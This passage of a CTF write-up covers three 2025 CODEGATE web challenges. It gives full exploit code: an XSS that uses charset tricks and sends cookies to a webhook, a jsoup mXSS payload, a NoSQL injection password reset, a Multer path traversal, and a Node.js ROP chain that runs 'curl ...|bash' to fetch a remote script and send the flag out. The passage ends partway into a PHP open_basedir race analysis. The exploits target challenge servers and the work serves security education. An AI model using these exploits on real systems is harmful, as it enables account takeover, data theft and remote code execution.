JIS X 0201 Search Results

In addition to ISO-2022-JP, there also existed a charset called **JIS_X0201**.

Therefore, by specifying this charset in the email’s Content-Type and sending it, the backslash (`\`) was successfully replaced with `¥`, and I was able to execute `alert(1)`!

![\ is mapped to ¥](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2019.png)

\ is mapped to ¥

![alert(1) is successfully triggered when using the JIS_X0201 charset.](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2020.png)

alert(1) is successfully triggered when using the JIS_X0201 charset.

Now, the only step left is to use the script to send the cookie value to my webhook site.

The final PoC is as follows.

```python
import smtplib
from email.message import EmailMessage
import base64

SMTP_HOST = "127.0.0.1"
SMTP_PORT = 25
USERNAME  = "test@securemail.com"
PASSWORD  = "test123456"

msg = EmailMessage()
msg["Subject"] = "\x1b(Jpayload"
msg["From"]    = USERNAME
msg["To"]      = "admin@securemail.com"
content = """<style>\x1b(J ";location.href='https://webhook.site/c9b79407-0e3d-41ce-a5bd-ccd1ba099ef0/?q='+document.cookie//</style>"""
b64_text = base64.b64encode(content.encode()).decode()
msg.set_payload(b64_text)
msg["Content-Type"]              = 'text/html; charset=JIS_X0201'
msg["Content-Transfer-Encoding"] = 'base64'

with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=10) as s:
    s.ehlo()
    if s.has_extn("STARTTLS"):
        s.starttls()
        s.ehlo()
    s.login(USERNAME, PASSWORD)
    s.send_message(msg)

print("Complete!")
```

![**Acquire flag**](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2021.png)

**Acquire flag**

In addition to the **JIS_X0201** charset, charsets starting with **`x-Mac`**such as **`x-MacRoman`** and **`x-MacArabic`**, also worked.

![A charset starting with x-Mac other than JIS_X0201](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2022.png)

A charset starting with x-Mac other than JIS_X0201

## **Unintended Solution**

This challenge also had an unintended and very simple solution.

First, let’s take another look at the `escapeJsStringLiteral` function.

![escapeJsStringLiteral function in MailController.java](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2023.png)

escapeJsStringLiteral function in MailController.java

To prevent breaking out of the `<script>` block, the closing tag `</script>` is escaped as `<\\/script>`.

However, since the filter does not distinguish between uppercase and lowercase letters, it can be bypassed using something like `</Script>`.

For example, if you insert the following content:

```html
<style>
  </Script><Script>alert(1);//
</style>
```

the browser interprets it as closing the previous `<script>` block, opening a new `<script>` block, and executing the `alert(1)` statement.

![Closing the existing script tag and opening a new one allowed the `alert(1)` to be executed successfully.](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2024.png)

Closing the existing script tag and opening a new one allowed the `alert(1)` to be executed successfully.

## BONUS : Jsoup.clean bypass

There is a way to bypass the `Jsoup.clean` function used in the `parseMessage` function.

![[MailboxService.java](http://MailboxService.java), parseMessage Function](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2012.png)

[MailboxService.java](http://MailboxService.java), parseMessage Function

The version of jsoup currently in use is 1.20.1. Searching for vulnerabilities in this version reveals an XSS vulnerability present in versions 1.21.0 and below.

https://intel.aikido.dev/cve/AIKIDO-2025-10401
I was able to craft an mXSS payload by appropriately using the `style` syntax.

```html
<svg></p><style><a style="</style><img src=1 onerror=alert(1)>">
```

# [WEB] chachadotcom

(10 solves)

## TL;DR

Although this was presented as a web category challenge, it's a "webnable" challenge that combines both web and pwnable fields. Solving this challenge requires chaining three vulnerabilities:

- NoSQL Injection
- Multer LFI
- NodeJS ROP

The NodeJS ROP technique, in particular, is a lesser-known trick that was presented at Hexacon. It was a fascinating vulnerability because it's a technique that makes Remote Code Execution (RCE) possible through arbitrary directory creation alone.

In this section, we will take a detailed look at each of these vulnerabilities.

## Analysis

To briefly explain how the web server works: it has login and registration features. When a user is logged in, they can post questions. If a user logs in as an admin, they can answer the questions.

![Main Page](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2025.png)

Main Page

### Takeover ADMIN account

Our first step is to take over the admin account.

We can find a clue in the `resetPassword` section of `controllers/userController.js`.

![resetPassword function in controllers/userController.js](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2026.png)

resetPassword function in controllers/userController.js

If `change` is true, it verifies the token for the corresponding email and attempts to change the password.

At this point, the token verification is handled by the `sendResetPassword` function. However, because this function accepts the token value directly (as-is), a NoSQL injection vulnerability occurs.

![sendResetPassword Function](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2027.png)

sendResetPassword Function

Therefore, we should be able to change the 'guide' email's password using this function.

However, the 'guide' email is also redacted, as can be seen in `app.js`.

![**The initMongo function in app.js**](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2028.png)

**The initMongo function in app.js**

Therefore, we must first discover the 'guide' email and then change the password for the 'guide' account.

The 'guide' email address can be found in the `createUser` function within `controllers/userController.js`.

![createUser function in controllers/userController.js](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2029.png)

createUser function in controllers/userController.js

The system uses a Regular Expression (Regex) to check the email. If the email account already exists, it returns **`User already exists`**. If the email doesn't exist but the username is already in use, it returns **`Username already taken` .**

We can exploit this behavior to leak the 'guide' email. First, we create a dummy account with a known username. Then, by sending requests with different Regex patterns in the email field and observing whether the server responds with `User already exists` or `Username already taken`, we can progressively reconstruct the full 'guide' email address.

```python
import requests
import tqdm

# URL = "http://43.203.117.21:3000"
URL = "http://127.0.0.1:3000"

words = "abcdefghijklmnopqrstuvwxyz0123456789"
guide_email= "guide_"
email_prefix = "guide\\_"
for i in tqdm.tqdm(range(11)):
    for s in words:
        # qwer계정을 먼저 만들어야 한다.
        r1 = requests.post(URL+'/api/auth/register', json={'username':'qwer','email':f'{email_prefix}{s}.*@admin\\.com', 'password':'qwer'})
        if "User already exists" in r1.text:
            guide_email+= s
            email_prefix+=s
            break
print(guide_email+"@admin.com")
```

![guide email leak](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2030.png)

guide email leak

Then, in the `/api/auth/reset` section, you can bypass the token using the $ne operator.

```python
POST /api/auth/reset HTTP/1.1
Host: 0.0.0.0:3000
Content-Length: 96
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://0.0.0.0:3000
Referer: http://0.0.0.0:3000/reset
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh;q=0.5
Connection: keep-alive

{
		"email":"guide_abcd1234efg@admin.com",
		"change":true,
		"token":{"$ne":"asdf"},
		"password":"hihi"
}
```

Afterwards, you can log in to your guide account using your guide email and changed password.

### Multer Module LFI

If you successfully log in with the 'guide' account, you can create and edit answers.
The sections related to answers can be found in `answerRoutes.js` and `answerController.js`.

![answerRoutes.js](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2031.png)

answerRoutes.js

You can create an answer with a **`POST /`** request, and upload an image with a **`PUT /:uuid`** request.

The part we need to focus on is the PUT request. It directly receives an image file using **`upload.single`**, and the upload itself is handled by the **Multer** module.

![multer upload in answerRoutes.js](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2032.png)

multer upload in answerRoutes.js

Here, the code assumes the incoming filename is `latin1` encoded and reinterprets it as a `utf-8` string using the following logic:

```jsx
file.originalname = Buffer.name(file.originalname, "latin1").toString("utf-8");
```

ormally, a path traversal sequence like `../` would be sanitized. However, this code allows for a bypass using special characters.

Due to this flawed logic, the character **`丯` (U+4E2F)** is incorrectly reinterpreted as the **`/` (U+002F)** character.

https://huntr.com/bounties/92a875fe-c5b3-485c-b03f-d3185189e0b1

```python
import requests
from urllib.parse import quote

URL = "http://127.0.0.1:3000/api/answers/ad8f99b0-0c32-4c40-ba30-34af54148a0f"

cookies = {
    "JSESSIONID": "CFEF4335ED24DBD59C8F3693E6BD9FEF",
    "token":      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoiNjg3ZjhiYzFhM2YzMjZlMjk0Mzc5MTM1Iiwicm9sZSI6Imd1aWRlIn0sImlhdCI6MTc1MzE4OTM3MCwiZXhwIjoxNzUzMjc1NzcwfQ.RYUt6JOK3-AO_NPk2COVeT_jO_uPor1OH6shiiu3L8A"
}

with open("payload.bin", "rb") as f:
    file_content = f.read()

file_name_raw = "/tmp/pwned"
filename = "..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯" + file_name_raw.replace("/", "丯")

filename_rfc5987 = f"UTF-8''{quote(filename)}"
boundary = "----WebKitFormBoundaryWzBpweyhtRcd9i8R"
dash_boundary = f"--{boundary}"

body = bytearray()

body += (
    f"{dash_boundary}\r\n"
    'Content-Disposition: form-data; name="text"\r\n\r\n'
    "asdfasdfasdf\r\n"
).encode()

body += (
    f"{dash_boundary}\r\n"
    'Content-Disposition: form-data; name="rating"\r\n\r\n'
    "5\r\n"
).encode()

body += (
    f"{dash_boundary}\r\n"
    f'Content-Disposition: form-data; name="image"; filename*={filename_rfc5987}\r\n'
    "Content-Type: text/html\r\n\r\n"
).encode()
body += file_content + b"\r\n"
body += (f"{dash_boundary}--\r\n").encode()

headers = {
    "Content-Type": f"multipart/form-data; boundary={boundary}",
    "Cookie": "; ".join(f"{k}={v}" for k, v in cookies.items()),
}

resp = requests.put(URL, data=body, headers=headers, timeout=10)
print(resp.status_code, resp.text)

```

This allows us to write a file to a directory of our choice!

However, this is where the real challenge begins. Even though we can write a file, we couldn't find a point in the other parts of the code to achieve Remote Code Execution (RCE).

But, there is a technique to achieve RCE in NodeJS when you can write a file to an arbitrary path—especially when you can write inside the `/proc` directory.

### NodeJS ROP

The technique is to achieve RCE by writing malicious code that can execute a ROP chain to the `/proc/self/fd/{fdnum}` path.

This method was presented at Hexacon 2024 and is described in detail in the reference below.

https://www.sonarsource.com/blog/why-code-security-matters-even-in-hardened-environments/

Here, I will briefly explain this vulnerability.

The `/proc/<pid>/fd/` directory represents all file descriptors opened by a given process in the form of symbolic links. Each entry can point to various types of files, such as regular files, device files, anonymous pipes, or event files.

Normally, it is difficult to write data directly to an anonymous pipe from an external source because it's hard to know where its write-enabled endpoint is.

However, by targeting `/proc/<pid>/fd/<fd_number>` through the procfs, it's possible to write directly to the pipe's write-descriptor. In other words, since `/proc/<pid>/fd/<fd_number>` is a "view" into the process's open file descriptors, write permissions exist as long as that specific `fd` was opened in a write-enabled mode.

Notably, this is possible even on a read-only mount. In environments like Docker containers, where `procfs` might be mounted as read-only, writing is not blocked because the underlying pipe operations are managed by `pipefs`, not `procfs`.

This allows an attacker to supply arbitrary data to an event handler that is reading from that anonymous pipe.

NodeJS processes use a library called **libuv**, which utilizes anonymous pipes to send and process event signals. This allows an attacker to attempt writing to these pipes to inject a malicious payload.

The libuv source code contains a `uv_signal_event` handler. This handler reads data to fill a buffer with the size of a `uv__signal_msg_t` struct. This struct is defined as follows:

```c
typedef struct {
  uv_signal_t* handle;
  int signum;
} uv__signal_msg_t;
```

`handle` is of type `uv_signal_t` and actually points to the internal `uv_signal_s` struct within libuv.

```c
struct uv_signal_s {
  UV_HANDLE_FIELDS
  uv_signal_cb signal_cb;
  int signum;
  // [...]
```

Here, the **`signal_cb`** member is a function pointer that holds the address of the callback function to be executed by the event handler when the `msg->signum` and `handle->signum` values match.

Therefore, if an attacker can make the two `signum` values equal and place a desired address into **`handle->signal_cb`**, the program's execution will branch to the attacker-specified code when that function is called.

If you check the security mitigations on the NodeJS binary, you can see that **PIE is disabled**.

![**Protection technique of node binary ⇒ You can check that PIE is turned off.**](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2033.png)

**Protection technique of node binary ⇒ You can check that PIE is turned off.**

Since **PIE is disabled**, the code section addresses are always static, allowing an attacker to easily build a **ROP chain**.

This challenge uses version **23.10.0** of Node.js, so I downloaded the corresponding node binary and found the necessary **ROP gadget** addresses.

![Find ROPgadget in node v23.10.0 ⇒ ex) pop rax ; ret](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2034.png)

Find ROPgadget in node v23.10.0 ⇒ ex) pop rax ; ret

For the payload, I referenced the PoC code shared by @toasterpwn and the reference below. (thanks to @toasterpwn!)

https://i0.rs/blog/engineering-a-rop-chain-against-node-js/

https://learnblockchain.cn/article/14186
The code below builds a ROP chain to create the malicious `exploit.bin` file.

```python
from pwn import *
import string
import requests
from urllib.parse import quote

def make_rop_chain():

    # All addresses must be valid UTF-8
    PIVOT_GADGET = 0x42b06b
    SIGNUM = 0x1289500  # must be equal to dword after PIVOT_GADGET
    RW_SECTION = 0x0000000006a9d000

    SYSCALL = 0x0000000000f339d8  # syscall
    POP_RAX = 0x0000000000ecb88a  # pop rax; ret
    POP_RDI = 0x00000000012273dd  # pop rdi; ret
    POP_RSI = 0x0000000000f66719  # pop rsi; ret
    POP_RDX = 0x000000000118de62  # pop rdx; ret
    MOV_GADGET = 0x0000000001478938  # mov qword ptr [rdi], rsi ; ret

    context.arch = "amd64"

    def gadget_write_at(addr, qword):
        if isinstance(qword, bytes):
            if len(qword) > 8:
                raise ValueError("qword cannot be larger than 8 bytes")
            qword = qword.ljust(8, b"\x00")
        yield POP_RDI
        yield addr
        yield POP_RSI
        yield qword
        yield MOV_GADGET

    def gadget_create_string(addr, s):
        s = s.encode() + b"\x00"
        for i in range(0, len(s), 8):
            yield from gadget_write_at(addr + i, s[i:i+8])

    if __name__ == "__main__":
        argv = [RW_SECTION+0x100, RW_SECTION+0x200, RW_SECTION+0x300]
        argv_arr = RW_SECTION

        content = flat([
            PIVOT_GADGET,
            SIGNUM,

            # Write execve() arguments
            *gadget_create_string(argv[0], "/bin/sh"),
            *gadget_create_string(argv[1], "-c"),
            # *gadget_create_string(argv[2], f"curl {SHELL_HOST}:{SHELL_PORT}|sh"),
            #*gadget_create_string(argv[2], f"sleep 100"),
            *gadget_create_string(argv[2], f"touch /tmp/pwned"),
            #! Warning: due to limited chain size, the command needs to be pretty short

            # Create argv[] array
            *gadget_write_at(argv_arr, argv[0]),
            *gadget_write_at(argv_arr + 8, argv[1]),
            *gadget_write_at(argv_arr + 16, argv[2]),

            # Run execve syscall
            POP_RAX,
            constants.SYS_execve,
            POP_RDI,
            argv[0],
            POP_RSI,
            argv_arr,
            POP_RDX,
            0,
            SYSCALL,
        ])

        return content

file_content = make_rop_chain()
with open('exploit.bin', 'wb') as f:
    f.write(file_content)
```

An important point to note is that for the exploit to be successful, all addresses used in it must be valid UTF-8 characters.

In this particular version of Node.js, all the gadget addresses were already valid UTF-8, so I did not add any separate logic to check for this.

## Exploit

Here is a summary of the exploit process described above:

1. **Leak the admin's email address.**
2. **Change the admin's password.**
3. **Exploit the Multer vulnerability** to upload the malicious `exploit.bin` file to `/proc/self/fd/{fd_number}`.
4. **Obtain a shell.**

Below is the full exploit code:

```python
from pwn import *
import tqdm
import string
import requests
from urllib.parse import quote

def make_rop_chain():
    # All addresses must be valid UTF-8
    PIVOT_GADGET = 0x42b06b
    SIGNUM = 0x1289500  # must be equal to dword after PIVOT_GADGET
    RW_SECTION = 0x0000000006a9d000

    SYSCALL = 0x0000000000f339d8  # syscall
    POP_RAX = 0x0000000000ecb88a  # pop rax; ret
    POP_RDI = 0x00000000012273dd  # pop rdi; ret
    POP_RSI = 0x0000000000f66719  # pop rsi; ret
    POP_RDX = 0x000000000118de62  # pop rdx; ret
    MOV_GADGET = 0x0000000001478938  # mov qword ptr [rdi], rsi ; ret

    context.arch = "amd64"

    def gadget_write_at(addr, qword):
        if isinstance(qword, bytes):
            if len(qword) > 8:
                raise ValueError("qword cannot be larger than 8 bytes")
            qword = qword.ljust(8, b"\x00")
        yield POP_RDI
        yield addr
        yield POP_RSI
        yield qword
        yield MOV_GADGET

    def gadget_create_string(addr, s):
        s = s.encode() + b"\x00"
        for i in range(0, len(s), 8):
            yield from gadget_write_at(addr + i, s[i:i+8])

    if __name__ == "__main__":
        argv = [RW_SECTION+0x100, RW_SECTION+0x200, RW_SECTION+0x300]
        argv_arr = RW_SECTION

        content = flat([
            PIVOT_GADGET,
            SIGNUM,

            # Write execve() arguments
            *gadget_create_string(argv[0], "/bin/sh"),
            *gadget_create_string(argv[1], "-c"),
            # *gadget_create_string(argv[2], f"curl {SHELL_HOST}:{SHELL_PORT}|sh"),
            #*gadget_create_string(argv[2], f"sleep 100"),
            *gadget_create_string(argv[2], f"curl https://predo.run.goorm.site|bash"),
            #! Warning: due to limited chain size, the command needs to be pretty short

            # Create argv[] array
            *gadget_write_at(argv_arr, argv[0]),
            *gadget_write_at(argv_arr + 8, argv[1]),
            *gadget_write_at(argv_arr + 16, argv[2]),

            # Run execve syscall
            POP_RAX,
            constants.SYS_execve,
            POP_RDI,
            argv[0],
            POP_RSI,
            argv_arr,
            POP_RDX,
            0,
            SYSCALL,
        ])

        return content

URL = "http://127.0.0.1:3000"
# URL = "http://43.203.131.177:3000/"

# make qwer credential first
requests.post(URL + '/api/auth/register', json={'username':'qwer', 'email':'qwer@test.com', 'password':'qwer'})

# leak guide email
words = "abcdefghijklmnopqrstuvwxyz0123456789"
guide_email = "guide_"
email_prefix = "guide\\_"
for i in tqdm.tqdm(range(11)):
    for s in words:
        r1 = requests.post(URL+'/api/auth/register', json={'username':'qwer','email':f'{email_prefix}{s}.*@admin\\.com', 'password':'qwer'})
        if "User already exists" in r1.text:
            guide_email += s
            email_prefix+=s
            break
guide_email += "@admin.com"
print(f"guide_email : {guide_email}")

# change guide password
new_password = 'hihi'
requests.post(URL + '/api/auth/reset', json={'email':guide_email, 'change':True, 'token':{'$ne':'asdf'},'password':new_password})

# make question & answer
session = requests.Session()
session.post(URL + '/api/auth/login', json={'email':guide_email, 'password':new_password})
session.post(URL + '/api/questions', json={'text':'test', 'category':'General'})
r1 = session.get(URL + '/api/questions')
data = r1.json()
r2 = session.post(URL + '/api/answers', json={'text':'asdf','questionId':data[0]['_id']})
data = r2.json()
answer_id = data['uuid']
print(answer_id)

# make rop chain
file_content = make_rop_chain()

# write exploit.bin at /proc/self/fd/{fdnum}
file_name_raw = "/proc/self/fd/12"
filename = "..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯..丯" + file_name_raw.replace("/", "丯")

filename_rfc5987 = f"UTF-8''{quote(filename)}"
boundary = "----WebKitFormBoundaryWzBpweyhtRcd9i8R"
dash_boundary = f"--{boundary}"

body = bytearray()

body += (
    f"{dash_boundary}\r\n"
    'Content-Disposition: form-data; name="text"\r\n\r\n'
    "asdfasdfasdf\r\n"
).encode()

body += (
    f"{dash_boundary}\r\n"
    'Content-Disposition: form-data; name="rating"\r\n\r\n'
    "5\r\n"
).encode()

body += (
    f"{dash_boundary}\r\n"
    f'Content-Disposition: form-data; name="image"; filename*={filename_rfc5987}\r\n'
    "Content-Type: text/html\r\n\r\n"
).encode()
body += file_content + b"\r\n"
body += (f"{dash_boundary}--\r\n").encode()

headers = {
    "Content-Type": f"multipart/form-data; boundary={boundary}",
}

resp = session.put(URL + f'/api/answers/{answer_id}', data=body, headers=headers)
print(resp.status_code, resp.text)

```

In my environment, file descriptor (fd) number **12** worked.

Also, because the ROP chain has a limited size, I configured the payload with a minimal length to execute a shell.

To do this, I used the following command:

```bash
curl [https://predo.run.goorm.site|bash](https://predo.run.goorm.site%7Cbash)
```

This command executes the response sent from my server directly using **bash**.

Also, I placed the following command on my server:

```bash
curl -k "[https://webhook.site/c9b79407-0e3d-41ce-a5bd-ccd1ba099ef0?q=$(/](https://webhook.site/c9b79407-0e3d-41ce-a5bd-ccd1ba099ef0?q=$(/readflag*)%5C%5C)readflag*|python3 -c 'import sys, urlib.parse; print(urlib.parse.quote(sys.stdin.read()))')"
```

This setup causes the target server to connect to my server and execute `curl`. The output of `/readflag*` is then URL-encoded and sent directly back.

Specifically, if the **FLAG** contains spaces, it might not be transmitted correctly. To prevent this, I used Python's `urllib.parse.quote` to ensure the **FLAG** value was URL-encoded before being sent.

![Acquire FLAG](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2035.png)

Acquire FLAG

# [WEB] gravelbox

## TL;DR

This challenge is about bypassing PHP’s **open_basedir** restriction to read `/flag.txt`. In a PHP 8.4 environment, arbitrary code execution is possible through the `eval` function, but due to the configuration `open_basedir=/var/www/html:/tmp`, access to files outside the allowed directories is blocked.

In the past, various bypass techniques such as the curl extension, the glob protocol, and symlinks were available, but all of them have since been patched. This problem can instead be solved by exploiting a TOCTOU (Time-of-Check-Time-of-Use) vulnerability in PHP’s `expand_filepath()` function.

The core of the attack is to create a race condition between two processes. One process repeatedly calls `file_get_contents("../../flag.txt")`, while the other process repeatedly performs a directory `rename` operation. By exploiting the time gap between the path resolution phase and the `open_basedir` validation phase, it becomes possible to successfully access the flag file located outside the restricted directories.

## Overview

This is a **One Line PHP Challenge** that demonstrates the characteristics of typical high-difficulty PHP problems.

```php
<?php
@$_GET['key'] === (getenv('TEAM_KEY') ?? random_bytes(16)) ? eval(@$_GET['code']) : show_source(__FILE__);
```

The `index.php` file consists of just 2 lines of code and directly executes user input through the `eval` function.

Looking at `docker-compose.yml`, the flag exists at `/flag.txt` with read permission (r). However, `disable_functions` and [`open_basedir`](https://www.php.net/manual/en/ini.core.php#ini.open-basedir) are applied in the PHP execution environment to prevent direct file access, so these restrictions must be bypassed.

```yaml
services:
  php:
    build:
      context: .
      dockerfile: ./src/Dockerfile
    container_name: web_gravelbox_${TEAM_NAME:-test}
    working_dir: /var/www/html
    environment:
      - TEAM_KEY=${TEAM_KEY:-test}
    volumes:
      - ./src:/var/www/html:ro
      - ./flag.txt:/flag.txt:ro
    ports:
      - ${TEAM_PORT:-60080}:8000
    command:
      - php
      - -d
      - disable_functions=pcntl_alarm,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv
      - -d
      - open_basedir=/var/www/html:/tmp
      - -S
      - 0.0.0.0:8000
      - -t
      - /var/www/html
```

The important part is the `open_basedir=/var/www/html:/tmp` setting. This is a security mechanism that blocks PHP from accessing files outside specified directories. Although the flag file is located at `/flag.txt`, access to that path is prevented by `open_basedir`.

Therefore, the objective of this challenge is to bypass PHP engine's own `open_basedir` restriction to read the flag.

### Old techniques

Before finding actual vulnerabilities, let me list some historical cases.

In the past, php (php-src) had various methods to bypass `open_basedir`.

Method using **curl extension** - https://github.com/php/php-src/issues/16802

Method using **glob:// protocol** - https://bugs.php.net/bug.php?id=73891

Method using symlinks - https://bugs.php.net/bug.php?id=77850

open_basedir bypass summary (munsiwoo) - https://blog.munsiwoo.kr/2018/09/open_basedir-bypass/

...

These can also be found on [bugs.php.net](https://bugs.php.net/).

![image.png](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2036.png)

Various bypass techniques existed, but they have all been patched and are no longer usable.

## Analysis

To solve this challenge, you need to download the 8.4 version of php-src (PHP source code written in C).

```bash
git clone https://github.com/php/php-src.git
```

(As of August 2025, 8.4.x was the latest version, so no version change was needed after git clone.)

### Guideline for php-src analysis

To smoothly proceed with php-src analysis, there's one core concept you must understand first. Understanding this will help avoid confusion during code analysis.

```c
/* {{{ OnUpdateBaseDir
Allows any change to open_basedir setting in during Startup and Shutdown events,
or a tightening during activation/runtime/deactivation */
PHPAPI ZEND_INI_MH(OnUpdateBaseDir)
{
	...
	return SUCCESS;
}
/* }}} */
```

The code presented above is part of the php-src code that handles `open_basedir` settings.

However, someone seeing this code for the first time would notice that the function declaration appears quite different from typical C language function declarations.

This phenomenon occurs because **php-src primarily utilizes macros defined through `#define`**.
Most macro names are composed of uppercase letters. This follows common C language coding conventions, helping to visually distinguish macros from regular functions or variables. Therefore, when analyzing PHP-SRC code, you should **always keep in mind that identifiers composed of uppercase letters are likely macros**.

Looking at the actual definition of the `ZEND_INI_MH` macro from the earlier example:

```c
#define ZEND_INI_MH(name) int name(zend_ini_entry *entry, zend_string *new_value, void *mh_arg1, void *mh_arg2, void *mh_arg3, int stage)
```

Through this macro definition, we can see that `ZEND_INI_MH(OnUpdateBaseDir)` actually becomes the following function:

```c
int OnUpdateBaseDir(zend_ini_entry *entry, zend_string *new_value, void *mh_arg1, void *mh_arg2, void *mh_arg3, int stage)
```

This shows us that the `OnUpdateBaseDir` function returns an `int` type and takes a total of 6 parameters.

There are also several important considerations regarding macros.

First, since macros are processed as text substitutions at compile time, you must think based on the expanded form to understand runtime behavior.

Second, some macros include conditional compilation, so they may expand to different code depending on the build environment (OS) or compilation options. When running PHP on Windows, some code from the `win32/` folder is used, and the macro definition process also includes checking for Windows as shown below:

```c
#ifdef _WIN32

#include <windows.h>
```

With this understanding, you should be able to analyze php-src code more easily.

(Since gravelbox operates in a Docker environment, the analysis was conducted based on Linux.)

### 1. OnUpdateBaseDir()

`ini_set('open_basedir', ...)` is implemented in `OnUpdateBaseDir()` in `main/fopen_wrappers.c`.

```c
/* {{{ OnUpdateBaseDir
Allows any change to open_basedir setting in during Startup and Shutdown events,
or a tightening during activation/runtime/deactivation */
PHPAPI ZEND_INI_MH(OnUpdateBaseDir)
{
	char **p = (char **) ZEND_INI_GET_ADDR();

	...

	/* Is the proposed open_basedir at least as restrictive as the current setting? */
	smart_str buf = {0};
	ptr = pathbuf = estrdup(ZSTR_VAL(new_value));
	while (ptr && *ptr) {
		...
		if (expand_filepath(ptr, resolved_name) == NULL) { // [1] Resolve realpath
		...
		if (php_check_open_basedir_ex(resolved_name, 0) != 0) {
		// [2] Check basedir eligibility
		...
	}
	efree(pathbuf);

	/* Everything checks out, set it */
	zend_string *tmp = smart_str_extract(&buf);
	char *result = estrdup(ZSTR_VAL(tmp)); // [3] Add it to runtime property
	if (PG(open_basedir_modified)) {
		efree(*p);
	}
	*p = result;
	PG(open_basedir_modified) = true;
	zend_string_release(tmp);

	return SUCCESS;
}
/* }}} */
```

The code operates in the following sequence:

1. **Convert `new_value` to `realpath`** to obtain the actual path.
2. **Check if the converted path complies with `open_basedir` policy**.
3. **Apply the verified path to the runtime environment**.

The core code is as follows:

```c
	/* Is the proposed open_basedir at least as restrictive as the current setting? */
	smart_str buf = {0};
	ptr = pathbuf = estrdup(ZSTR_VAL(new_value));
	while (ptr && *ptr) {
		end = strchr(ptr, DEFAULT_DIR_SEPARATOR); // [1] Split with ':' (Windows = ';')
		if (end != NULL) {
			*end = '\0';
			end++;
		}
		char resolved_name[MAXPATHLEN + 1];
		if (expand_filepath(ptr, resolved_name) == NULL) { // [2] Resolve realpath
			efree(pathbuf);
			smart_str_free(&buf);
			return FAILURE; // FAIL
		}
		if (php_check_open_basedir_ex(resolved_name, 0) != 0) { // [3] Check eligibility
			/* At least one portion of this open_basedir is less restrictive than the prior one, FAIL */
			efree(pathbuf);
			smart_str_free(&buf); // FAIL
			return FAILURE;
		}
		if (smart_str_get_len(&buf) != 0) {
			smart_str_appendc(&buf, DEFAULT_DIR_SEPARATOR);
		}
		smart_str_appends(&buf, resolved_name); // [4] SUCCESS
		ptr = end;
	}
```

**[1]** splits new_value by DEFAULT_DIR_SEPARATOR.

This allows specifying multiple paths for open_basedir as follows:

```c
open_basedir=/tmp:/var/www/html
```

**[2]** obtains the actual path through `expand_filepath()`.

**[3]** checks eligibility through `php_check_open_basedir_ex()`.

If all conditions are satisfied, **[4]** returns SUCCESS.

### 2. expand_filepath()

`expand_filepath()` calls functions in the following sequence:

`expand_filepath` → `expand_filepath_ex` → `expand_filepath_with_mode`

Finally calls `expand_filepath_with_mode(filepath, real_path, NULL, 0, CWD_FILEPATH)`.

```c
/* {{{ expand_filepath_use_realpath */
PHPAPI char *expand_filepath_with_mode(const char *filepath, char *real_path, const char *relative_to, size_t relative_to_len, int realpath_mode)
{
	cwd_state new_state;
	char cwd[MAXPATHLEN];
	size_t copy_len;
	size_t path_len;

	if (!filepath[0]) {
		return NULL;
	}

	path_len = strlen(filepath);

	if (IS_ABSOLUTE_PATH(filepath, path_len)) {
		cwd[0] = '\0';
	} else { // [1]
		const char *iam = SG(request_info).path_translated;
		const char *result;
		if (relative_to) {
			...
		} else { // [2]
			result = VCWD_GETCWD(cwd, MAXPATHLEN);
		}

